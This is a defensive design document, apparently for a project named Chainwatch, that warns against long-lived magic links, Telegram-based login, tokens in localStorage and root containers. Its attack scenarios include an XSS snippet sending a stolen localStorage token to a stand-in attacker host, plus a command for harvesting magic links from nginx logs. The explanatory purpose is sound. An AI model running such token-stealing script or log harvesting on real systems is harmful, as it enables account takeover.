# RootOps Antipatterns

**Principiis obsta** — resist the beginnings.

These are not bugs. These are **forbidden architectures**.

---

## What is RootOps

RootOps is the practice of operating on **root causes**, not symptoms.

RootOps focuses on:
- Preventing irreversible actions upstream
- Removing dangerous execution paths entirely
- Enforcing capability boundaries before runtime
- Designing systems where **nothing happening is success**

RootOps is not:
- Observability
- SRE
- Incident response
- Dashboards
- Postmortems

**If a system requires heroics to stay safe, RootOps considers it already failed.**

---

## Antipattern: "Convenient Trust Amplifier"

### Definition

A system where **convenience of access** is prioritized over **trust boundaries**, resulting in:

1. One artifact grants full access
2. Trust never expires or decays
3. Context is never re-verified
4. Control is replaced with hope
5. "It hasn't been attacked yet" is the security model

### Characteristic Symptoms

**Red flag phrases:**
- "It's just an internal tool"
- "We have Docker for isolation"
- "We use HTTPS"
- "We added Telegram login for convenience"
- "We haven't been hacked yet"
- "The secret is in a private repo"
- "Only trusted employees have access"

**Architectural signatures:**
- Magic links valid for weeks
- JWT tokens without expiration
- Bot tokens with admin scope
- Container as security boundary (but running as root)
- Credentials in URLs or localStorage
- IdP without revocation capabilities

### Why This Is Root-Level

This antipattern creates **irreversible trust capture**.

Once an attacker obtains any credential, they own the system **indefinitely** because:
- No time boundaries
- No device boundaries
- No context verification
- No revocation mechanism

This is not a vulnerability. This is a **design that makes compromise inevitable**.

### Real Incident Pattern

**Stage 1: Convenient Design**
```
"Let's use Telegram for auth - it's so easy!"
"Magic links are more convenient than passwords"
"Let's give them 30 days so they don't have to re-login"
"Docker will keep it safe"
```

**Stage 2: Structural Vulnerabilities**
```
✓ Magic link in URL → logs, referrer, browser history
✓ Telegram as sole IdP → SIM swap attack vector
✓ 30-day sessions → persistent access after one capture
✓ Container as root → escape = full system
✓ Tokens in localStorage → XSS = full access
```

**Stage 3: Inevitable Compromise**
```
Attacker obtains any one of:
- Leaked magic link from logs
- Hijacked Telegram account
- XSS to steal localStorage
- Container escape

Result: Full system access, potentially for 30 days, undetectable
```

**Stage 4: "How did this happen?"**
```
The answer: by design.
```

### Attack Scenarios (Real Examples)

**Scenario 1: XSS → localStorage → 30 days**
```javascript
// Attacker injects XSS
<script>
  const token = localStorage.getItem('auth_token');
  fetch('https://attacker.com/steal?token=' + token);
</script>

// Result: Attacker has valid token for 30 days
```

**Scenario 2: Telegram Hijack → Full Access**
```
1. SIM swap attack
2. Take over victim's Telegram
3. Use bot to generate magic link
4. Full system access
```

**Scenario 3: nginx Logs → Magic Links**
```bash
# Magic links in URLs are logged
grep "magic" /var/log/nginx/access.log

# Result: Every magic link ever issued is in cleartext logs
```

**Scenario 4: Link Forwarding**
```
Employee forwards magic link to colleague
Link is permanent access token
Colleague now has full access
Original employee doesn't even know
```

**Scenario 5: Container Escape**
```bash
# Container running as root, no seccomp
docker run --user root --cap-add=ALL

# Attacker exploits app vulnerability
# Escapes container (easy because root + full capabilities)
# Now owns host system
```

### The Root Violations

All five Chainwatch security classes (CW-01 through CW-05) are present:

1. **CW-01: Unbounded Authentication Artifacts**
   - Magic links with no expiration
   - JWT tokens without device binding

2. **CW-02: Irreversible Trust Escalation**
   - One click → 30 days of trust
   - No re-verification

3. **CW-03: Opaque Identity Provider**
   - Telegram as IdP (no revocation, no MFA policies)

4. **CW-04: Credential Leakage Surfaces**
   - Secrets in URLs (logs, referrer, history)
   - Tokens in localStorage (XSS-accessible)

5. **CW-05: Container Illusion of Safety**
   - Docker as "security" (but root + RW + secrets)

**This is not bad luck. This is a forbidden architecture.**

---

## RootOps Response

**Question:** "How do we secure this system?"

**RootOps Answer:** "You don't. You reject the design."

**Rejected patterns:**
- ❌ Unbounded trust artifacts
- ❌ Opaque identity providers for privileged access
- ❌ Secrets on leakage surfaces
- ❌ One-time capture → long-term access
- ❌ Container as substitute for actual isolation

**Accepted patterns:**
- ✅ Short-lived, context-bound credentials
- ✅ Enterprise IdP with revocation
- ✅ Secrets in secure stores, not URLs/localStorage
- ✅ Periodic re-verification of trust
- ✅ Defense in depth (container + isolation + least privilege)

---

## The Core Principle

**Convenient Trust Amplifier** violates Chainwatch's foundation:

> If recovery is impossible, refuse the design.

**Recovery is impossible when:**
- You can't revoke compromised credentials (opaque IdP)
- You can't detect compromise (no audit trail)
- You can't limit blast radius (unbounded artifacts)
- You can't prevent leakage (structural leakage surfaces)

**Therefore: refuse the design before code is written.**

---

## How to Apply RootOps Thinking

### Wrong Question
"Is this implementation secure?"

### Right Question
"Does this architecture allow irreversible capture?"

### Wrong Approach
- Penetration testing
- Vulnerability scanning
- WAF rules
- Monitoring dashboards

These operate **after** the dangerous architecture exists.

### Right Approach
- Reject unbounded auth artifacts **at design review**
- Reject opaque IdPs **before integration**
- Reject credential leakage surfaces **in API design**
- Reject container-as-security **in deployment planning**

**Intervene before the system exists.**

---

## Detection Checklist

Use this before building authentication systems:

**Red Flags (Reject immediately):**
- [ ] Authentication tokens have no expiration
- [ ] Magic links can be reused multiple times
- [ ] Tokens grant access for > 24 hours
- [ ] IdP has no revocation API
- [ ] Credentials pass through URLs
- [ ] Secrets stored in localStorage
- [ ] Containers run as root
- [ ] "Internal tool" as security justification
- [ ] "Docker" as security layer
- [ ] "HTTPS" listed as security feature

**If any are checked: this is a Convenient Trust Amplifier.**

---

## Related RootOps Principles

### Zero-Knowledge as Organizational Principle

The best way to protect knowledge is to **not consolidate it**.

Examples from non-digital world:
- Coca-Cola formula (not patented, parts separated)
- Chartreuse recipe (known only to two monks, orally transmitted)
- WD-40 composition (never filed as patent)
- KFC "11 herbs & spices" (split between suppliers)

**Principle:** If knowledge cannot be fully reconstructed, it cannot be fully stolen.

**Applied to credentials:**
- Don't create artifacts that grant full access
- Don't consolidate all trust in one token
- Don't make capture equivalent to ownership

### Principiis obsta — Resist the Beginnings

Don't fight the fire. Remove the fuel.

**Traditional approach:**
- Deploy the system
- Monitor for attacks
- Respond to incidents
- Patch vulnerabilities

**RootOps approach:**
- Reject dangerous architectures
- Remove attack surfaces entirely
- Design so compromise is structurally impossible
- Silence when nothing is happening

**The best security incident is the one that cannot happen.**

---

## Case Study: The AI Agent Knowledge Base

**Announced design:**
- AI agent with full system automation
- Telegram-based authentication
- Magic links for access
- Docker for "security"
- Knowledge base with corporate secrets

**Immediate RootOps violations detected:**

1. **Unbounded artifacts:** Magic links, no device binding
2. **Irreversible escalation:** One link = permanent access
3. **Opaque IdP:** Telegram (no enterprise controls)
4. **Leakage surfaces:** Links in URLs, tokens in localStorage
5. **Container illusion:** Docker as security, likely root

**Attack surface analysis (5 scenarios, all trivial):**
- XSS → localStorage → 30 days access
- Telegram hijack → full access
- nginx logs → all magic links
- Link forwarding → unintended access
- Container escape → host compromise

**RootOps verdict:**
This is not "needs security review."
This is "architecture must be rejected."

**Why specialists will remain employed:**
Because "AI generated the system" does not mean "the system is correct."

Root cause analysis, boundary detection, and architectural rejection are human skills.

---

## Summary

**Convenient Trust Amplifier** is a class, not an incident.

It appears when:
- Convenience > boundaries
- Hope > control
- "Works so far" > structural safety

**RootOps response:**
Reject at design. Not at pentest. Not at incident. **At design.**

**Chainwatch enforces this by:**
- Detecting unbounded auth artifacts
- Refusing opaque IdPs
- Blocking leakage surfaces
- Rejecting container illusions
- Preventing irreversible trust escalation

**Before any code runs.**

---

## References

- `docs/security-classes.md` - Five Chainwatch security classes (CW-01 through CW-05)
- `docs/irreversible-boundaries.md` - Authority boundaries philosophy
- `docs/DESIGN_BASELINE.md` - Principiis obsta foundation

---

**If a system relies on "nobody has attacked it yet," it is already compromised by design.**

---

*RootOps antipatterns for Chainwatch - 2026-02-03*
